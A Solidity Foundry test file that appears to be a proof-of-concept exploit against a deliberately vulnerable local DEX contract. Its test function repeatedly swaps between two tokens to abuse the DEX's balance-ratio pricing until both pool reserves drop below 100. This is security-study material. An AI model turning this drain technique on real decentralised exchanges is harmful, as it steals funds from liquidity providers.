// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {Dex,SwappableToken} from "src/Dex.sol";

contract Dex_POC is Test {
    Dex _dex;
    SwappableToken token1;
    SwappableToken token2;
    function init() private{
        vm.startPrank(address(0x10));
        _dex = new Dex();
        token1 = new SwappableToken(address(_dex), "Token1", "TKN1", 1000);
        token2 = new SwappableToken(address(_dex), "Token2", "TKN2", 1000);
        _dex.setTokens(address(token1), address(token2));
        _dex.approve(address(_dex), 1000);
        _dex.addLiquidity(address(token1), 100);
        _dex.addLiquidity(address(token2), 100);
        token1.transfer(address(this), 10);
        token2.transfer(address(this), 10);
        vm.stopPrank();
    }
    function setUp() public {
        init();
    }
    function test_Dex_POC() public{
        _dex.approve(address(_dex), 100000000);
        while (true){
            if(token1.balanceOf(address(_dex))<100 && token2.balanceOf(address(_dex))<100)
                break;
            uint256 amount1 = token1.balanceOf(address(this));
                if(token1.balanceOf(address(_dex))>amount1){
                    _dex.swap(address(token1), address(token2), amount1);
                }else{
                    _dex.swap(address(token1), address(token2), token1.balanceOf(address(_dex))-1);
                }
            uint256 amount2 = token2.balanceOf(address(this));
                if(token2.balanceOf(address(_dex))>amount2){
                    _dex.swap(address(token2), address(token1), amount2);
                }else{
                    _dex.swap(address(token2), address(token1),token2.balanceOf(address(_dex))-1);
                }
        }
        console.log("Success",token1.balanceOf(address(_dex))<100 && token2.balanceOf(address(_dex))<100);
    }
}
